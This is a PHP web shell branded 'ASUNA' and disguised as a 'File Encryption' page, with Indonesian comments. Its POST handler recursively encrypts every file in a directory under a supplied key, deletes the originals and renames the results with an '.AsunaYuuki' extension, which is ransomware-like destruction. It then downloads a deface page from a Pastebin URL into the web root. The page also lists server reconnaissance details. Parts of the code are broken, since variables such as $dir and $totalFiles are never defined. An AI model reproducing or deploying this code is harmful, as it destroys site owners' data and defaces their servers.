<!DOCTYPE html>
<html>
<head>
    <title>File Encryption</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style type="text/css">
    body {
  background-color: #15202b;
  color: #fff;
  margin: 0;
  padding: 0;
}

h1 {
  color: #fff;
  text-align: center;
  margin-top: 20px;
}

form {
  max-width: 500px;
  margin: 0 auto;
  padding: 20px;
  background-color: #192734;
  border: 1px solid #38444d;
  border-radius: 5px;
  box-shadow: 0px 0px 5px rgba(0, 0, 0, 0.1);
}

label {
  display: block;
  font-weight: bold;
  margin-bottom: 10px;
  color: #fff;
}

input[type="text"] {
  display: block;
  width: 100%;
  padding: 10px;
  border: 1px solid #38444d;
  border-radius: 5px;
  box-sizing: border-box;
  margin-bottom: 20px;
  background-color: #15202b;
  color: #fff;
}

input[type="submit"] {
  display: block;
  width: 100%;
  padding: 10px;
  background-color: #1da1f2;
  color: #fff;
  border: none;
  border-radius: 5px;
  cursor: pointer;
}

.info {
  max-width: 500px;
  margin: 0 auto;
  margin-top: 20px;
  background-color: #192734;
  border: 1px solid #38444d;
  border-radius: 5px;
  box-shadow: 0px 0px 5px rgba(0, 0, 0, 0.1);
  padding: 20px;
  color: #fff;
}

.info ul {
  list-style: none;
  margin: 0;
  padding: 0;
}

.info ul li {
  margin-bottom: 10px;
}

.info ul li:first-child {
  font-weight: bold;
}

.info ul li:last-child {
  margin-bottom: 0;
}

.info h2 {
  color: #fff;
  font-size: 18px;
  margin-bottom: 20px;
}
    </style>
</head>
<body>
    <h1>ASUNA</h1>
    <form method="POST">
        <label for="key">Enter key to encrypt files:</label><br>
        <input type="text" id="key" name="key"><br>
        <input type="submit" value="Submit">
    </form>
    <div class="info">
        <h2>Server Information:</h2>
        <ul>
            <li>Web Server: <?php echo $_SERVER['SERVER_SOFTWARE']; ?></li>
            <li>System : <?php $uname = explode(" ", php_uname()); echo $uname[0] . " " . $uname[1]; ?></li>
            <li>IP : <?php echo gethostbyname($_SERVER['HTTP_HOST']); ?></li>            
            <li>Mysql : <?php echo (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";?></li>
           <li>Server Country: <?php echo isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'N/A'; ?></li>
            <li>Server Version: <?php echo $_SERVER['SERVER_PROTOCOL']; ?></li>
        </ul>
    </div>
    <?php
function getServerCountry() {
        $ip = $_SERVER['SERVER_ADDR'];
        if (function_exists('geoip_country_name_by_name')) {
            $country = geoip_country_name_by_name($ip);
            if ($country) {
                return $country;
            }
        }
        return 'N/A';
    }
    
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $key = $_POST['key'];
        $encryptedFiles = 0;
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        foreach ($files as $name => $file) {
            if (! $file->isDir()) {
                $content = file_get_contents($name);
                $iv = openssl_random_pseudo_bytes(16);
                $encrypted = openssl_encrypt($content, 'AES-256-CBC', $key, 0, $iv);
                file_put_contents($name . '.AsunaYuuki', $iv . $encrypted);
                unlink($name);
                $encryptedFiles++;
                $progress = round(($encryptedFiles / $totalFiles) * 100, 2);
                echo "Meng-Enkripsi file $name ($progress%)...<br>";
                flush();
                ob_flush();
            }
        }
        echo "File Berhasil Di Enkripsi";
        // Etto, ini fungsi buat download script deface Download file dari Pastebin
        $fileUrl = 'https://pastebin.com/raw/xxxxxxxx';
        $data = file_get_contents($fileUrl);
        file_put_contents('index.html', $data);
        // jan diubah, ini cuma fungsi buat mindah file index ke root
        rename('index.html', $_SERVER['DOCUMENT_ROOT'] . '/index.html');
        echo "Script Deface Mu Berhasil dipindahkan ke direktori ROOT.";
    }
    ?>
    </body>
    </html>
